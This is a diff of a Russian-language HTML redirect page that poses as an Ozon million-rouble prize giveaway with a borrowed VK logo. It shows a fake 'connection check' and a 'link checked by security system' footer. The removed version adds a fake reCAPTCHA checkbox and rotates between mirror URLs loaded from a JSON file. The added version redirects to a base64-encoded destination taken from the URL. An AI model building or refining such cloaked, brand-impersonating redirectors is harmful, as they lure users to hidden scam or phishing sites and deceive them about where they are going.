@@ -1,22 +1,18 @@
 <!DOCTYPE html>
 <html lang="ru">
-<head> 
+<head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="referrer" content="same-origin">
-    
-    <title>Безопасная проверка соединения • Ozon Партнеры 2026</title>
-    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer">
+    <title>https://ozon.ru/gifts2026</title>
     <meta name="description" content="🏆 Стань миллионером с Ozon! Делай любимые покупки, выполняй задания и участвуй в розыгрыше главного приза. Твой шанс забрать миллион — всего в одном клике! 💸">
-    <meta name="robots" content="noindex, nofollow">
-    <meta name="theme-color" content="#3498db">
 
     <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSSDHluiqX23boxkBdeAr5RmwJnWUkPViRP0nQKLqLJnA&s=10">
 
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://ozon.ru/gifts">
-    <meta property="og:title" content="OZON.ru маркетплейс – миллионы товаров по выгодным...">
+    <meta property="og:url" content="https://ozon.ru/gifts"> <meta property="og:title" content="OZON.ru маркетплейс – миллионы товаров по выгодным...">
     <meta property="og:description" content="🏆 Стань миллионером с Ozon! Делай любимые покупки, выполняй задания и участвуй в розыгрыше главного приза. Твой шанс забрать миллион — всего в одном клике! 💸">
+    
     <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSSDHluiqX23boxkBdeAr5RmwJnWUkPViRP0nQKLqLJnA&s=10">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
@@ -25,374 +21,119 @@
     <meta name="twitter:title" content="OZON.ru маркетплейс – миллионы товаров по выгодным...">
     <meta name="twitter:description" content="🏆 Стань миллионером с Ozon! Делай любимые покупки, выполняй задания и участвуй в розыгрыше главного приза. Твой шанс забрать миллион — всего в одном клике! 💸">
     <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSSDHluiqX23boxkBdeAr5RmwJnWUkPViRP0nQKLqLJnA&s=10">
-
     <style>
-        /* ----- RESET & BASE ----- */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%); 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            color: #333; 
         }
 
-        body {
-            background: linear-gradient(145deg, #eef1f6 0%, #dbe0e8 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            color: #2c3e50;
-            padding: 16px;
-        }
-
-        .card {
+        .redirect-container {
             background: #ffffff;
-            border-radius: 20px;
-            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.06), 0 2px 10px rgba(0, 0, 0, 0.02);
-            padding: 42px 32px 32px;
-            max-width: 420px;
-            width: 100%;
+            padding: 40px 30px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
             text-align: center;
-            transition: all 0.2s ease;
+            max-width: 400px;
+            width: 90%;
         }
 
-        /* ----- LOGO ----- */
-        .brand {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 70px;
-            margin-bottom: 28px;
+        .logo-area {
+            margin-bottom: 25px;
         }
 
-        .brand img {
-            max-width: 180px;
-            max-height: 64px;
+        /* Стильный временный логотип, если нет картинки */
+        .logo-placeholder {
+            font-size: 24px;
+            font-weight: 700;
+            color: #3498db;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .logo-img {
+            max-width: 150px;
+            max-height: 60px;
             object-fit: contain;
-            display: block;
         }
 
-        /* ----- SPINNER ----- */
-        .spinner {
-            width: 54px;
-            height: 54px;
-            border: 4px solid rgba(52, 152, 219, 0.08);
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            animation: rotate 0.9s cubic-bezier(0.6, 0.2, 0.4, 0.8) infinite;
-            margin: 18px auto;
+        .loader-ring {
             display: inline-block;
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(52, 152, 219, 0.1);
+            border-radius: 50%;
+            border-top-color: #3498db;
+            animation: spin 1s ease-in-out infinite;
+            margin: 20px 0;
         }
 
-        @keyframes rotate {
+        @keyframes spin {
             to { transform: rotate(360deg); }
         }
 
-        /* ----- TYPOGRAPHY ----- */
-        .heading {
-            font-size: 19px;
-            font-weight: 700;
-            color: #1a2634;
+        h2 {
+            font-size: 18px;
+            font-weight: 600;
             margin-bottom: 8px;
-            letter-spacing: -0.2px;
-        }
-
-        .subtext {
-            font-size: 14px;
-            color: #6b7a8a;
-            line-height: 1.6;
-            margin-bottom: 4px;
-        }
-
-        .badge {
-            display: inline-block;
-            font-size: 12px;
-            font-weight: 500;
-            color: #3498db;
-            margin-top: 10px;
-            padding: 4px 12px;
-            background: rgba(52, 152, 219, 0.06);
-            border-radius: 20px;
-            letter-spacing: 0.2px;
-        }
-
-        /* ----- CAPTCHA BLOCK ----- */
-        .captcha-panel {
-            display: none;
-            background: #f7f9fc;
-            border: 1px solid #e2e8f0;
-            border-radius: 8px;
-            padding: 16px 20px;
-            margin: 24px auto 10px;
-            max-width: 320px;
-            align-items: center;
-            justify-content: space-between;
-            box-shadow: 0 1px 4px rgba(0,0,0,0.02);
-        }
-
-        .captcha-left {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-        }
-
-        .captcha-check {
-            width: 22px;
-            height: 22px;
-            cursor: pointer;
-            accent-color: #2980b9;
-            flex-shrink: 0;
-        }
-
-        .captcha-label {
-            font-size: 14px;
-            font-weight: 500;
             color: #2c3e50;
-            cursor: pointer;
-            user-select: none;
         }
 
-        .captcha-right {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            font-size: 9px;
-            color: #8899aa;
-            line-height: 1.3;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
+        p {
+            font-size: 14px;
+            color: #7f8c8d;
+            line-height: 1.5;
         }
 
-        .captcha-icon {
-            width: 28px;
-            height: 28px;
-            background: url('https://upload.wikimedia.org/wikipedia/commons/a/ad/RecaptchaAnchor.svg') no-repeat center;
-            background-size: contain;
-            margin-bottom: 2px;
-        }
-
-        /* ----- FOOTER ----- */
-        .footer {
-            margin-top: 32px;
-            padding-top: 18px;
-            border-top: 1px solid #ecf0f3;
-            font-size: 11px;
-            color: #9aa9b9;
-            line-height: 1.6;
-        }
-
-        .footer span {
-            opacity: 0.7;
-        }
-
-        /* ----- RESPONSIVE ----- */
-        @media (max-width: 440px) {
-            .card { padding: 28px 18px 24px; }
-            .brand img { max-width: 140px; }
+        .footer-note {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #edf2f7;
+            font-size: 12px;
+            color: #95a5a6;
         }
     </style>
 </head>
 <body>
 
-    <div class="card" role="main">
-
-        <!-- ЛОГОТИП -->
-        <div class="brand">
-            <img src="https://thumb.cloud.mail.ru/weblink/thumb/xw1/TfKk/QGyS93cW7/PNG%20-%20digital/VK%20Logo.png?mt=1684832836000" 
-                 alt="Логотип партнера" 
-                 onerror="this.outerHTML='<div style=\'font-size:22px;font-weight:700;color:#2c3e50;\'>OZON</div>';">
+    <div class="redirect-container">
+        <!-- БЛОК ЛОГОТИПА -->
+        <div class="logo-area">
+            <!-- Если есть прямая ссылка на логотип, замените src. Если нет — покажется текст ниже -->
+            <img src="https://thumb.cloud.mail.ru/weblink/thumb/xw1/TfKk/QGyS93cW7/PNG%20-%20digital/VK%20Logo.png?mt=1684832836000" alt="Логотип" class="logo-img">
+            <!--<div class="logo-placeholder">ВКонтакте</div>-->
         </div>
 
-        <!-- АНИМАЦИЯ ЗАГРУЗКИ -->
-        <div class="spinner" id="loader"></div>
+        <div class="loader-ring"></div>
 
-        <!-- БЛОК КАПЧИ -->
-        <div class="captcha-panel" id="captchaBox">
-            <div class="captcha-left">
-                <input type="checkbox" id="captchaCheck" class="captcha-check">
-                <label for="captchaCheck" class="captcha-label">Я не робот</label>
-            </div>
-            <div class="captcha-right">
-                <div class="captcha-icon"></div>
-                <span>Защита</span>
-                <span>данных</span>
-            </div>
-        </div>
+        <h2>Проверка соединения...</h2>
+        <p>Вы перенаправляетесь на сайт партнера. <br>Это займет не более 3 секунд.</p>
 
-        <!-- ЗАГОЛОВКИ И СТАТУС -->
-        <h1 class="heading" id="title">Проверка соединения...</h1>
-        <p class="subtext" id="desc">Выполняется сканирование сетевых узлов.</p>
-        <div class="badge" id="status"></div>
-
-        <!-- ПОДВАЛ -->
-        <div class="footer">
-            <span>Ссылка проверена системой безопасности.</span><br>
-            <span>© 2026 Защищенное перенаправление</span>
+        <!-- БЛОК С ПОДПИСЬЮ -->
+        <div class="footer-note">
+            Ссылка проверена системой безопасности. <br>
+            © 2026 Защищенное перенаправление трафика.
         </div>
     </div>
 
     <script>
-        (function() {
-            'use strict';
-
-            // ---- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ----
-
-            // Перемешивание массива (Fisher–Yates)
-            function mixArray(arr) {
-                const a = arr.slice();
-                for (let i = a.length - 1; i > 0; i--) {
-                    const j = Math.floor(Math.random() * (i + 1));
-                    [a[i], a[j]] = [a[j], a[i]];
-                }
-                return a;
-            }
-
-            // Проверка доступности URL (с таймаутом)
-            function pingUrl(url) {
-                return new Promise((resolve) => {
-                    const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 3500);
-
-                    fetch(url, {
-                        method: 'HEAD',
-                        mode: 'no-cors',
-                        cache: 'no-store',
-                        signal: controller.signal
-                    })
-                    .then(() => {
-                        clearTimeout(timeoutId);
-                        resolve(true);
-                    })
-                    .catch(() => {
-                        clearTimeout(timeoutId);
-                        resolve(false);
-                    });
-                });
-            }
-
-            // ---- ГЛАВНАЯ ФУНКЦИЯ ----
-
-            async function init() {
-                const titleEl = document.getElementById('title');
-                const descEl = document.getElementById('desc');
-                const statusEl = document.getElementById('status');
-                const loaderEl = document.getElementById('loader');
-                const captchaBox = document.getElementById('captchaBox');
-                const captchaCheck = document.getElementById('captchaCheck');
-
-                let urlList = [];
-
-                // 1. Загружаем urls.json
-                try {
-                    const resp = await fetch('./urls.json', { cache: 'no-store' });
-                    if (!resp.ok) throw new Error('HTTP ' + resp.status);
-                    urlList = await resp.json();
-                } catch (err) {
-                    titleEl.textContent = 'Ошибка загрузки';
-                    descEl.textContent = 'Не удалось получить список серверов.';
-                    statusEl.textContent = 'Код: E01';
-                    statusEl.style.background = 'rgba(231, 76, 60, 0.08)';
-                    statusEl.style.color = '#c0392b';
-                    loaderEl.style.display = 'none';
-                    return;
-                }
-
-                if (!Array.isArray(urlList) || urlList.length === 0) {
-                    titleEl.textContent = 'Нет адресов';
-                    descEl.textContent = 'Конфигурационный файл пуст.';
-                    statusEl.textContent = 'Код: E02';
-                    statusEl.style.background = 'rgba(231, 76, 60, 0.08)';
-                    statusEl.style.color = '#c0392b';
-                    loaderEl.style.display = 'none';
-                    return;
-                }
-
-                // 2. Перемешиваем ссылки
-                const shuffled = mixArray(urlList);
-
-                // 3. Прячем спиннер, показываем капчу
-                loaderEl.style.display = 'none';
-                captchaBox.style.display = 'flex';
-
-                titleEl.textContent = 'Подтвердите действие';
-                descEl.textContent = 'Для перехода на сайт партнера подтвердите, что вы человек.';
-                statusEl.textContent = '';
-                statusEl.style.background = 'transparent';
-                statusEl.style.color = '#3498db';
-
-                // 4. Обработчик капчи
-                captchaCheck.addEventListener('change', async function() {
-                    if (!this.checked) return;
-
-                    // Блокируем повторные клики
-                    this.disabled = true;
-                    captchaBox.style.display = 'none';
-                    loaderEl.style.display = 'inline-block';
-
-                    titleEl.textContent = 'Поиск сервера...';
-                    descEl.textContent = 'Пожалуйста, подождите, идет выбор оптимального узла.';
-                    statusEl.textContent = 'Сканирование...';
-                    statusEl.style.background = 'transparent';
-                    statusEl.style.color = '#3498db';
-
-                    let chosenUrl = null;
-
-                    // 5. Проверяем ссылки по очереди
-                    for (let i = 0; i < shuffled.length; i++) {
-                        const candidate = shuffled[i];
-                        try {
-                            // Показываем прогресс
-                            const hostname = new URL(candidate).hostname;
-                            statusEl.textContent = `Проверка: ${hostname}`;
-
-                            const alive = await pingUrl(candidate);
-                            if (alive) {
-                                chosenUrl = candidate;
-                                break;
-                            }
-                        } catch (_) {
-                            // Пропускаем ошибочные URL
-                            continue;
-                        }
-                    }
-
-                    // 6. Финал
-                    if (chosenUrl) {
-                        titleEl.textContent = 'Соединение готово';
-                        descEl.innerHTML = 'Вы будете перенаправлены через несколько секунд.';
-                        statusEl.textContent = '✓ Безопасный канал';
-                        statusEl.style.background = 'rgba(46, 204, 113, 0.1)';
-                        statusEl.style.color = '#27ae60';
-
-                        setTimeout(() => {
-                            window.location.replace(chosenUrl);
-                        }, 2800);
-                    } else {
-                        titleEl.textContent = 'Серверы недоступны';
-                        descEl.textContent = 'Все узлы временно перегружены. Попробуйте позже.';
-                        statusEl.textContent = '✗ Ошибка соединения';
-                        statusEl.style.background = 'rgba(231, 76, 60, 0.08)';
-                        statusEl.style.color = '#c0392b';
-                        loaderEl.style.display = 'none';
-                        // Разблокируем капчу для повторной попытки
-                        captchaCheck.disabled = false;
-                        captchaBox.style.display = 'flex';
-                        titleEl.textContent = 'Повторите попытку';
-                        descEl.textContent = 'Отметьте чекбокс, чтобы начать заново.';
-                        statusEl.textContent = '';
-                        statusEl.style.background = 'transparent';
-                    }
-                });
-            }
-
-            // Запускаем при загрузке
-            if (document.readyState === 'complete' || document.readyState === 'interactive') {
-                init();
-            } else {
-                document.addEventListener('DOMContentLoaded', init);
-            }
-        })();
+        const urlParams = new URLSearchParams(window.location.search);
+        const encoded = urlParams.get('open');
+        if (encoded) {
+            setTimeout(() => {
+                window.location.replace(atob(encoded));
+            }, 3000); // 3 секунды задержки
+        } else {
+            document.querySelector('h2').innerText = "Ошибка доступа";
+            document.querySelector('p').innerText = "Действие заблокировано или ссылка указана неверно.";
+            document.querySelector('.loader-ring').style.display = 'none';
+        }
     </script>
-
 </body>
 </html>
